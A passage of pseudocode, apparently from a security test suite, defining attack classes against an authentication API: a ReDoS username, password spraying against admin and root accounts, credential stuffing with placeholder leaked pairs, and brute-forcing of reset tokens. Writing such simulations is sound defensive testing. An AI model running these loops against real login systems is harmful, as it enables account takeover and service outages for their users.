// ATTACK 27: ReDoS via Username Validation
class ReDoSAttack {
    function attack_redos() {
        let malicious_username = "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
        // Complex regex that causes catastrophic backtracking
        if validate_username_complex(malicious_username) {
            register(malicious_username, "email@example.com", "password")
        }
    }
}

// ATTACK 28: Password Spraying with Common Patterns
class PasswordSprayingAttack {
    function attack_password_spraying() {
        let common_passwords = [
            "Password123!",
            "Admin123!",
            "Welcome123!",
            "Password@123",
            "Admin@123"
        ]
        let usernames = ["admin", "administrator", "root", "test"]
        
        for password in common_passwords {
            for username in usernames {
                login(username, password)
            }
        }
    }
}

// ATTACK 29: Credential Stuffing with Real Leaks
class CredentialStuffingAttack {
    function attack_credential_stuffing() {
        let leaked_credentials = [
            ("admin@example.com", "leaked_password_1"),
            ("user@example.com", "leaked_password_2"),
            ("test@example.com", "leaked_password_3")
        ]
        
        for (email, password) in leaked_credentials {
            // Try email as username
            login(email, password)
            // Try to extract username from email
            let username = email.split("@")[0]
            login(username, password)
        }
    }
}

// ATTACK 30: Account Takeover via Password Reset
class PasswordResetTakeoverAttack {
    function attack_password_reset() {
        let malicious_token = "admin_reset_token"
        let new_password = "hacked_password"
        
        // Try to guess reset tokens
        for i in 1..10000 {
            let guess_token = "reset_token_" + i
            let result = reset_password(guess_token, new_password)
            if result.success {
                log_success("Account takeover successful with token: " + guess_token)
                break
            }
        }
    }
}

